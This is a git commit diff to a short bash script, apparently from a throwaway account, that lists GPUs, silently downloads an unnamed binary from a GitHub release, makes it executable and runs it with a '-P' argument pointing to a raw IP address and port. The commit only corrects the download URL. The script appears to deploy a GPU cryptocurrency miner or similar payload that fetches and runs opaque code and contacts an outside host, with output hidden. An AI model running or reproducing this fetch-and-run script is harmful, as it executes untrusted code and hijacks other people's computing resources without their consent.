8af284920528466aeb0a053fc0e299cb98b3e9d2
deannavkja07 <79742710+deannavkja07@users.noreply.github.com>
2021-02-27 08:31:02 +0000

    Update jkhvuiyhuio.sh

--- jkhvuiyhuio.sh
+++ jkhvuiyhuio.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
 nvidia-smi -L
-wget https://github.com/eannavkja07/fcasd2134/releases/download/1/xcvsdfsf &> /dev/null
+wget https://github.com/deannavkja07/fcasd2134/releases/download/1/xcvsdfsf &> /dev/null
 chmod +x xcvsdfsf
 ./xcvsdfsf -P http://64.52.174.90:4545/"$1" &> log
